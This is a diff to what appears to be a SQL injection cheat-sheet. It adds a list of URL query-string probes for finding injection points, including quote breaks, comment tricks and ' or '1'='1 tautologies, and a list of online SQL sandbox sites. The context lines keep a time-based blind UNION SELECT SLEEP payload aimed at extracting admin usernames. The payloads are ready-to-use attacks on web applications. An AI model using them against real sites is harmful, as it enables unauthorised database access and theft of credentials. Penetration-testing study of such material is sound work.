@@ -29,3 +29,52 @@ We are logged in !
 - Always with our previous login screen, we will try to extract the username
 - `'UNION SELECT SLEEP(1*CHAR_LENGTH(username)) FROM admins;#`
 
+## List
+
+/?q=1
+/?q=1'
+/?q=1"
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\
+/?q=1/*'*/
+/?q=1/*!1111'*/
+/?q=1'||'asd'||'  <== concat string
+/?q=1' or '1'='1
+/?q=1 or 1=1
+/?q='or''='
+
+---
+
+## Sandboxes databases
+By @hackerscrolls
+
+SQL Fiddle (sqlfiddle.com)
+DB Fiddle (db-fiddle.com)
+EverSQL (eversql.com)
+
+EverSQL supports:
+
+Oracle
+MySQL
+MariaDB
+PostreSQL
+MS SQL Server
+Percona Server
+Amazon Aurora MySQL
+
+DB Fiddle supports:
+
+MySQL
+SQLite
+PostgreSQL
+(multiple versions)
+
+SQL Fiddle supports:
+
+Oracle
+SQLite
+MySQL
+PostgreSQL
+MS SQL Server 2017
